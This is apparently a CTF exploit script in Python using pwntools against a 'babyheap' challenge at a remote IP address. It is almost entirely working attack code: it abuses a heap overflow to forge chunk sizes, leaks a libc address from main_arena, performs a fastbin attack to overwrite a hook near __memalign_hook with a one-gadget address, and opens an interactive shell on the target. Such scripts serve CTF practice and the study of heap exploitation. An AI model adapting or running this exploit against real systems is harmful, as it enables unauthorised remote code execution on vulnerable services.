from pwn import *

#s = process("./babyheap_69a42acd160ab67a68047ca3f9c390b9")
#libc = ELF("libc.so.local")
libc = ELF("libc.so.6_b86ec517ee44b2d6c03096e0518c72a1")

s = remote("202.120.7.218",2017)

s.clean()

def alloc(size):
	s.sendline("1")
	s.sendline("%d" % size)
	s.recvuntil("Allocate Index ")
	buf = s.recvline()
	s.clean()
	return int(buf)
def fill(idx, buf):
	s.sendline("2")
	s.sendline("%d" % idx)
	s.sendline("%d" % len(buf))
	s.send(buf)
	s.clean()

def free(idx):
	s.sendline("3")
	s.sendline("%d" % idx)
	s.clean()

def dump(idx):
	s.sendline("4")
	s.sendline("%d" % idx)
	s.recvuntil("Content:")
	s.recvline()
	buf = s.recvline()[:-1]
	s.clean()
	return buf

e = alloc(0xff)
f = alloc(0xff)
g = alloc(0xff)

fill(e, "A"*0x100+p64(0)+p64(0x221))

free(f)

i = alloc(0xff)
j = alloc(0xff)
k = alloc(0xff)

free(j)
free(k)

buf = dump(g)

arena_ptr = u64(buf[:8])

#so, main_arena doesn't have a symbol, so I'm keying off __memalign_hook which is just before that (in my libc)
libc.address = arena_ptr-88-libc.symbols['__memalign_hook']-0x20

'''
print hex(libc.address)
print hex(arena_ptr)
'''

a = alloc(0x2f)
b = alloc(0x2f)
c = alloc(0x2f)
d = alloc(0x2f)

free(b)
free(c)

#this is some random 0x40 in libc that lets us fastbin
freeable = libc.symbols['__memalign_hook']-0x417-8

buf = cyclic(112)

buf += p64(0)
buf += p64(0x41)
buf += p64(freeable)

fill(a,buf)

e = alloc(0x2f)
f = alloc(0x2f)

fill(e,"/bin/sh\x00")

print hex(freeable)
bespoke = libc.address+0x4526A # local
bespoke = libc.address+0x41374 # remote
fill(f,"A"*0x41f+p64(bespoke))

s.sendline("1")
s.sendline("1")
s.interactive()
